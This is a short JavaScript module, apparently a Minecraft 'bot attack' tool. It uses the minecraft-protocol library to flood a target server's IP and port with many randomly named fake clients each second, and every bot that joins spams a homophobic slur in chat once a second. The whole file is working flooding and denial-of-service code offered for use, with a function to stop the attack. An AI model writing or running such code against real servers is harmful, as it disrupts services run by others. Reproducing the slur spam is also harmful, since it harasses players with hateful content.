const mc = require('minecraft-protocol');
let bots = [];

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function attackBot(ip, port, protocol, cps, duration) {
  console.log(`Starting attack on ${ip}:${port} with protocol ${protocol}, ${cps} cps for ${duration} seconds.`);
  let time = 0;
  let interval = setInterval(async () => {
    if (time >= duration) {
      clearInterval(interval);
      console.log('Attack finished.');
      return;
    }
    for (let i = 0; i < cps; i++) {
      const username = 'Bot_' + Math.floor(Math.random() * 100000);
      const client = mc.createClient({
        host: ip,
        port: parseInt(port),
        username: username,
        version: protocol === 'auto' ? false : protocol,
      });
      bots.push(client);

      client.on('login', () => {
        console.log(`[+] ${username} joined.`);
        setInterval(() => {
          client.write('chat', { message: '/me GAY' });
        }, 1000);
      });

      client.on('end', () => {
        console.log(`[-] ${username} disconnected.`);
      });

      client.on('error', (err) => {
        console.error(`[!] ${username} error:`, err.message);
      });
    }
    time++;
  }, 1000);
}

function stopAttack() {
  console.log('Stopping all bots...');
  bots.forEach(bot => {
    try {
      bot.end();
    } catch (e) {}
  });
  bots = [];
}

module.exports = { attackBot, stopAttack };